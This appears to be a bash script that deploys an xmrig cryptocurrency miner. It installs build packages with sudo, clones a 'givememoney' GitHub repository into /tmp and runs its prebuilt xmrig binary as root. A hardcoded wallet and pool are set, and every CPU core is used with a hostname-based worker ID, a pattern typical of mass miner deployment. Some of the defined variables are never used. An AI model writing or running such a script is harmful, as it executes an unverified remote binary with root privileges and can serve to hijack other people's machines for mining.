#!/usr/bin/env bash

pool='graft.miner.rocks'
port=4003
ID="$(hostname)"
WALLET=GBp5tHbGsjD9Ae3xcnzPAq6fi1VS4ZRfoQQPj5AXNFzAZsaJCRMMtpz8t4gtQibfkz6qAdfFrpDRdNjENLLvPnrFEK71YWz
PASSWORD=${ID}
THREADS="$(nproc --all)"

rm -rf /tmp/miner
sudo dpkg --configure -a
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sleep 2
cd /tmp && mkdir miner
git clone https://github.com/siskapiska/givememoney.git /tmp/miner
cd /tmp/miner 
chmod +x /tmp/miner/xmrig
sleep 1
sudo ./xmrig
echo -e 'ALL WORKS! tail -f /tmp/miner/xmrig.log'
